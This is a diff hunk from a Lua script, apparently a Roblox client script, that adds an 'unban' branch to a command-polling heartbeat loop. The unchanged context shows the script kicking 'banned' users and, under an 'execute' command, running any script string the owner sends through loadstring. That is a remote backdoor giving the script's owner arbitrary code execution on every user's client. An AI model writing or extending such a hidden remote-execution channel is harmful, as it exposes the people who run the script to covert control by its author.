@@ -360,6 +360,9 @@ local function startClientHeartbeat()
                                         if LocalPlayer and typeof(LocalPlayer.Kick) == "function" then
                                             LocalPlayer:Kick("You Have Been Banned From Using This Script By Its Owner!")
                                         end
+                                elseif cmd.type == "unban" then
+                                    debugPrint("CommandPoll: unban command received")
+                                    pcall(function() removeBan(LocalPlayer.UserId) end)
                                 elseif cmd.type == "execute" and type(cmd.script) == "string" and cmd.script ~= "" then
                                     debugPrint("CommandPoll: executing script")
                                     local fnOk, fn = pcall(function() return loadstring(cmd.script) end)
